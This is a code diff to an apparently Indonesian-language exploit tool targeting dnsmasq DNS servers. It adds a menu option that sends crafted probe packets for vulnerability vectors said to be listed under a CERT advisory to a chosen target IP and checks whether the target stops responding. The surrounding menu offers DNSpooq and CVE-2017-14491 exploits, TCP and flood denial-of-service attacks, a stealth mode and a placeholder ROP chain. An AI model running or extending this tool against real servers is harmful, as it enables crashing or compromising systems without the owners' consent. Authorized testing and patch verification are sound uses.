@@ -870,6 +870,34 @@ def exploit_dnspooq(target_ip):
     print(f"  4. Firewall/NAT memblokir spoofed packets")
     print(f"{'='*55}")
 
+def run_vectors_2026(target_ip):
+    """[v3.1] Menu vektor 2026 (CERT VU#471747) — probing non-flood + verdict jujur."""
+    try:
+        from vectors_2026 import VECTORS_2026
+    except ImportError as e:
+        print(f"[-] vectors_2026 tidak dapat di-import: {e}")
+        return
+    print(f"\n--- Vektor 2026 (fixed dnsmasq 2.90/2.92rel2) ---")
+    for i, (name, desc, fn) in enumerate(VECTORS_2026, 1):
+        print(f"  {i}. {name}: {desc}")
+    print("  0. Kembali")
+    choice = input("[?] Pilih vektor [0-5]: ").strip()
+    if not choice.isdigit() or not (1 <= int(choice) <= len(VECTORS_2026)):
+        return
+    name, desc, fn = VECTORS_2026[int(choice) - 1]
+    print(f"\n[*] Mengirim probe {name} ke {target_ip} (paket tunggal, non-flood)...")
+    try:
+        pkt = fn()
+        pkt[IP].dst = target_ip
+        send_packet(pkt)
+        time.sleep(1.5)
+        check_status_msg(target_ip, name)
+        print("[i] Ingat: 'tidak respons' = indikasi; konfirmasi via log/uptime target.")
+        print(f"[i] Fixed di dnsmasq 2.90+ (Debian 2.90-4~deb12u2 / 2.91-1+deb13u1).")
+    except Exception as e:
+        print(f"[-] {name} error: {e}")
+
+
 def main():
     global STEALTH_MODE
     if len(sys.argv) < 2:
@@ -916,6 +944,7 @@ def main():
         print("8. Heavy DOS      (100MB Flood)  [BLOCKED by default]")
         print("-" * 30)
         print("9. [UNVERIFIED] ROP Chain Construction (PLACEHOLDER offsets — no RCE proof)")
+        print("V. [2026] Vektor baru CERT VU#471747 (2291/4890/4891/4893/5172, fixed 2.90+)")
         print("S. Toggle Stealth Mode")
         print("A. Change Architecture")
         print("0. Exit")
@@ -931,6 +960,7 @@ def main():
         elif c == '7': exploit_tcp_dos(target_ip)
         elif c == '8': exploit_heavy_buffer(target_ip)
         elif c == '9': exploit_cve_2017_14491_enhanced(target_ip)
+        elif c == 'V': run_vectors_2026(target_ip)
         elif c == 'S': 
             STEALTH_MODE = not STEALTH_MODE
             print(f"[*] Stealth Mode toggled to: {STEALTH_MODE}")
